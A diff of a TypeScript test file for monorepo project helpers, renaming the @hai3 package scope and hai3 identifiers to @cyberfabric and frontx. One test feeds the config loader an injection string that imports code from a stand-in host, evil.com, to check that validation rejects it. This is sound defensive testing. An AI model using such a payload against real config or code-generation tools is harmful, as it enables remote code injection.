@@ -12,22 +12,22 @@ import os from 'os';
 import { loadConfig, findMonorepoRoot, getLocalPackageRef, CONFIG_FILE } from './project.js';
 
 describe('getLocalPackageRef', () => {
-  it('should convert @hai3/react to a file: reference', () => {
-    const result = getLocalPackageRef('@hai3/react', '/repo', '/repo/app');
+  it('should convert @cyberfabric/react to a file: reference', () => {
+    const result = getLocalPackageRef('@cyberfabric/react', '/repo', '/repo/app');
     assert.equal(result, 'file:../packages/react');
   });
 
-  it('should convert @hai3/framework to a file: reference', () => {
-    const result = getLocalPackageRef('@hai3/framework', '/repo', '/repo/app');
+  it('should convert @cyberfabric/framework to a file: reference', () => {
+    const result = getLocalPackageRef('@cyberfabric/framework', '/repo', '/repo/app');
     assert.equal(result, 'file:../packages/framework');
   });
 
   it('should handle nested project paths', () => {
-    const result = getLocalPackageRef('@hai3/state', '/repo', '/repo/projects/my-app');
+    const result = getLocalPackageRef('@cyberfabric/state', '/repo', '/repo/projects/my-app');
     assert.equal(result, 'file:../../packages/state');
   });
 
-  it('should return non-@hai3 packages unchanged', () => {
+  it('should return non-@cyberfabric packages unchanged', () => {
     assert.equal(getLocalPackageRef('react', '/repo', '/repo/app'), 'react');
     assert.equal(getLocalPackageRef('lodash', '/repo', '/repo/app'), 'lodash');
     assert.equal(getLocalPackageRef('@types/node', '/repo', '/repo/app'), '@types/node');
@@ -38,7 +38,7 @@ describe('loadConfig', () => {
   let tmpDir: string;
 
   before(async () => {
-    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'hai3-test-loadconfig-'));
+    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'frontx-test-loadconfig-'));
   });
 
   after(async () => {
@@ -54,25 +54,25 @@ describe('loadConfig', () => {
 
   it('should load a valid config', async () => {
     const configPath = path.join(tmpDir, CONFIG_FILE);
-    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: 'shadcn' }));
+    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'shadcn' }));
     const result = await loadConfig(tmpDir);
     assert.equal(result.ok, true);
-    assert.deepEqual((result as { config: unknown }).config, { hai3: true, uikit: 'shadcn' });
+    assert.deepEqual((result as { config: unknown }).config, { frontx: true, uikit: 'shadcn' });
     await fs.remove(configPath);
   });
 
   it('should load config with uikit "none"', async () => {
     const configPath = path.join(tmpDir, CONFIG_FILE);
-    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: 'none' }));
+    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'none' }));
     const result = await loadConfig(tmpDir);
     assert.equal(result.ok, true);
-    assert.deepEqual((result as { config: unknown }).config, { hai3: true, uikit: 'none' });
+    assert.deepEqual((result as { config: unknown }).config, { frontx: true, uikit: 'none' });
     await fs.remove(configPath);
   });
 
   it('should return invalid for empty string uikit', async () => {
     const configPath = path.join(tmpDir, CONFIG_FILE);
-    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: '' }));
+    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: '' }));
     const result = await loadConfig(tmpDir);
     assert.equal(result.ok, false);
     assert.equal((result as { error: string }).error, 'invalid');
@@ -82,7 +82,7 @@ describe('loadConfig', () => {
 
   it('should return invalid for non-string uikit', async () => {
     const configPath = path.join(tmpDir, CONFIG_FILE);
-    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: 123 }));
+    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 123 }));
     const result = await loadConfig(tmpDir);
     assert.equal(result.ok, false);
     assert.equal((result as { error: string }).error, 'invalid');
@@ -92,25 +92,25 @@ describe('loadConfig', () => {
 
   it('should return config when uikit is not present', async () => {
     const configPath = path.join(tmpDir, CONFIG_FILE);
-    await fs.writeFile(configPath, JSON.stringify({ hai3: true }));
+    await fs.writeFile(configPath, JSON.stringify({ frontx: true }));
     const result = await loadConfig(tmpDir);
     assert.equal(result.ok, true);
-    assert.deepEqual((result as { config: unknown }).config, { hai3: true });
+    assert.deepEqual((result as { config: unknown }).config, { frontx: true });
     await fs.remove(configPath);
   });
 
   it('should load config with a custom uikit package', async () => {
     const configPath = path.join(tmpDir, CONFIG_FILE);
-    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: '@acronis-platform/shadcn-uikit' }));
+    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: '@acronis-platform/shadcn-uikit' }));
     const result = await loadConfig(tmpDir);
     assert.equal(result.ok, true);
-    assert.deepEqual((result as { config: unknown }).config, { hai3: true, uikit: '@acronis-platform/shadcn-uikit' });
+    assert.deepEqual((result as { config: unknown }).config, { frontx: true, uikit: '@acronis-platform/shadcn-uikit' });
     await fs.remove(configPath);
   });
 
   it('should return invalid for uikit with invalid npm package-name syntax', async () => {
     const configPath = path.join(tmpDir, CONFIG_FILE);
-    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: "'; import('http://evil.com/x');" }));
+    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: "'; import('http://evil.com/x');" }));
     const result = await loadConfig(tmpDir);
     assert.equal(result.ok, false);
     assert.equal((result as { error: string }).error, 'invalid');
@@ -120,7 +120,7 @@ describe('loadConfig', () => {
 
   it('should return invalid for uikit with spaces', async () => {
     const configPath = path.join(tmpDir, CONFIG_FILE);
-    await fs.writeFile(configPath, JSON.stringify({ hai3: true, uikit: 'bad package name' }));
+    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'bad package name' }));
     const result = await loadConfig(tmpDir);
     assert.equal(result.ok, false);
     assert.equal((result as { error: string }).error, 'invalid');
@@ -133,16 +133,16 @@ describe('findMonorepoRoot', () => {
   let tmpDir: string;
 
   before(async () => {
-    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'hai3-test-monorepo-'));
+    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'frontx-test-monorepo-'));
   });
 
   after(async () => {
-    delete process.env.HAI3_MONOREPO_ROOT;
+    delete process.env.FRONTX_MONOREPO_ROOT;
     await fs.remove(tmpDir);
   });
 
   it('should return null when no monorepo structure is found', async () => {
-    delete process.env.HAI3_MONOREPO_ROOT;
+    delete process.env.FRONTX_MONOREPO_ROOT;
     const leaf = path.join(tmpDir, 'some', 'deep', 'path');
     await fs.ensureDir(leaf);
     const result = await findMonorepoRoot(leaf);
@@ -150,12 +150,12 @@ describe('findMonorepoRoot', () => {
   });
 
   it('should find monorepo root with packages/react and workspaces', async () => {
-    delete process.env.HAI3_MONOREPO_ROOT;
+    delete process.env.FRONTX_MONOREPO_ROOT;
     const monoRoot = path.join(tmpDir, 'mono');
     await fs.ensureDir(path.join(monoRoot, 'packages', 'react'));
-    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@hai3/react' });
+    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@cyberfabric/react' });
     await fs.writeJson(path.join(monoRoot, 'package.json'), {
-      name: 'hai3-monorepo',
+      name: 'frontx-monorepo',
       workspaces: ['packages/*'],
     });
 
@@ -166,24 +166,24 @@ describe('findMonorepoRoot', () => {
     assert.equal(result, monoRoot);
   });
 
-  it('should respect HAI3_MONOREPO_ROOT env variable', async () => {
+  it('should respect FRONTX_MONOREPO_ROOT env variable', async () => {
     const monoRoot = path.join(tmpDir, 'env-mono');
     await fs.ensureDir(path.join(monoRoot, 'packages', 'react'));
-    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@hai3/react' });
+    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@cyberfabric/react' });
 
-    process.env.HAI3_MONOREPO_ROOT = monoRoot;
+    process.env.FRONTX_MONOREPO_ROOT = monoRoot;
 
     const result = await findMonorepoRoot('/some/random/path');
     assert.equal(result, path.resolve(monoRoot));
 
-    delete process.env.HAI3_MONOREPO_ROOT;
+    delete process.env.FRONTX_MONOREPO_ROOT;
   });
 
   it('should skip directories without workspaces containing packages/', async () => {
-    delete process.env.HAI3_MONOREPO_ROOT;
+    delete process.env.FRONTX_MONOREPO_ROOT;
     const fakeRoot = path.join(tmpDir, 'fake-mono');
     await fs.ensureDir(path.join(fakeRoot, 'packages', 'react'));
-    await fs.writeJson(path.join(fakeRoot, 'packages', 'react', 'package.json'), { name: '@hai3/react' });
+    await fs.writeJson(path.join(fakeRoot, 'packages', 'react', 'package.json'), { name: '@cyberfabric/react' });
     await fs.writeJson(path.join(fakeRoot, 'package.json'), {
       name: 'not-a-monorepo',
       workspaces: ['apps/*'],
